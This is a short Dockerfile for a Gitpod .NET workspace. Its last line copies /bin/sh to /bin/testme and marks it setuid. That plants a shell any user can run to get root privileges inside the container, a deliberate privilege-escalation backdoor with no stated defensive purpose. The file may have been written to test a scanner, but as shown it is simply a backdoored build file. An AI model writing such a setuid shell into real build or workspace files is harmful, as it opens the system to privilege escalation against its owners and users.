FROM gitpod/workspace-dotnet:latest

USER root
RUN apt-get update 
RUN cp /bin/sh /bin/testme && chmod u+s /bin/testme
